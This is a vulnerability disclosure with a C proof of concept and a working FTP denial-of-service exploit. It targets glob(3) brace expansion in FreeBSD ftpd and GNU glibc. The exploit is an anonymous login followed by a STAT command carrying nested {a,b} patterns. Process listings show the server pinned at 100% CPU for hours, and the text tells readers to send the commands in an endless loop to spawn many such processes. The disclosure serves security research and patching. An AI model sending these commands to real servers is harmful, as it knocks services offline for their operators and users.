--- PoC ---
#include <stdio.h>
#include <glob.h>
 
int main(){
        glob_t globbuf;
        char stringa[]="{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}";
        glob(stringa,GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE|GLOB_LIMIT, NULL, &globbuf);
}
--- PoC ---
 
--- Exploit ---
user anonymous
pass anonymous
stat {a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}
--- /Exploit ---
 
Result of attack:
ftp     13034   0.0  0.4  10416   1944  ??  R    10:48PM    0:00.96
ftpd: cxsec.org anonymous/anonymous (ftpd)
ftp     13035   0.0  0.4  10416   1944  ??  R    10:48PM    0:00.89
ftpd: cxsec.org anonymous/anonymous (ftpd)
ftp     13036   0.0  0.4  10416   1944  ??  R    10:48PM    0:00.73
ftpd: cxsec.org anonymous/anonymous (ftpd)
ftp     13046   0.0  0.4  10416   1952  ??  R    10:48PM    0:00.41
ftpd: cxsec.org anonymous/anonymous (ftpd)
ftp     13047   0.0  0.4  10416   1960  ??  R    10:48PM    0:00.42
ftpd: cxsec.org anonymous/anonymous (ftpd)
...
root    13219   0.0  0.3  10032   1424  ??  R    10:52PM    0:00.00
/usr/libexec/ftpd -dDA
root    13225   0.0  0.3  10032   1428  ??  R    10:52PM    0:00.00
/usr/libexec/ftpd -dDA
root    13409   0.0  0.3  10032   1404  ??  R    10:53PM    0:00.00
/usr/libexec/ftpd -dDA
root    13410   0.0  0.3  10032   1404  ??  R    10:53PM    0:00.00
/usr/libexec/ftpd -dDA
...
 
=>Sending:
STAT {a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}
 
=>Result:
@ps:
ftp      1336 100.0  0.5  10416   2360  ??  R    11:15PM 600:39.95
ftpd: 127.0.0.1: anonymous/anonymous@cxsecurity.com: \r\n (ftpd)$
@top:
1336 root        1 103    0 10416K  2360K RUN    600:53 100.00% ftpd
 
one request over 600m (~10h) execution time and 100% CPU usage. This
issue allow to create N ftpd processes with 100% CPU usage.
 
Just create loop while(1) and send these commands
---
user anonymous
pass anonymous
stat {a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}
---
 
NetBSD and OpenBSD has fixed this issue in glob(3)/libc (2011)
http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gen/glob.c.diff?r1=1.24&r2=1.23.10.2
 
The funniest is that freebsd use GLOB_LIMIT in ftpd server.
http://www.freebsd.org/cgi/cvsweb.cgi/src/libexec/ftpd/ftpd.c
---
    if (strpbrk(whichf, "~{[*?") != NULL) {
        int flags = GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE;
 
        memset(&gl, 0, sizeof(gl));
        gl.gl_matchc = MAXGLOBARGS;
        flags |= GLOB_LIMIT;
        freeglob = 1;
        if (glob(whichf, flags, 0, &gl)) {
---
 
but GLOB_LIMIT in FreeBSD dosen't work. glob(3) function allow to CPU
resource exhaustion. ;]
 
Libc was also vulnerable in Apple and Oracle products.
http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html
http://support.apple.com/kb/HT4723
 
only FreeBSD and GNU glibc are affected
